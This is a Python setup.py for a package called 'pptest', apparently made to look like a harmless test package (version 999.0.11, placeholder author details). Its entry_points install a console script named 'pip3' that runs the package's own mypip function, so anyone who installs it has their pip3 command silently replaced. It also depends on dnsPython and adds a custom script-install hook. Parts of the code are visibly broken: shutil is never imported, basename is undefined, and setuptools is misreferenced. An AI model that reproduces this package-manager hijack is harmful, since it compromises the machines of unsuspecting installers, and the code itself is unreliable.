#!/usr/bin/env python
# coding: utf-8

from setuptools import setup
from setuptools.command.install_scripts import install_scripts

class InstallScripts(install_scripts):

    def run(self):
        setuptools.command.install_scripts.install_scripts.run(self)
        print('in setup....')
        # Rename some script files
        for script in self.get_outputs():
            if basename.endswith(".py") or basename.endswith(".sh"):
                dest = script[:-3]
            else:
                continue
            print("moving %s to %s" % (script, dest))
            shutil.move(script, dest)
setup(
    name='pptest',
    version='999.0.11',
    author='pptest',
    author_email='testtt@google.com',
    url='https://www.google.com',
    description=u'just for test',
    packages=['pptest'],
    install_requires=['dnsPython'],
    entry_points={
        'console_scripts': [
            'pip3=pptest:mypip',
            #'pip=pptest:mypip'
        ]
    },
    cmdclass={
        "install_scripts": InstallScripts
    }
)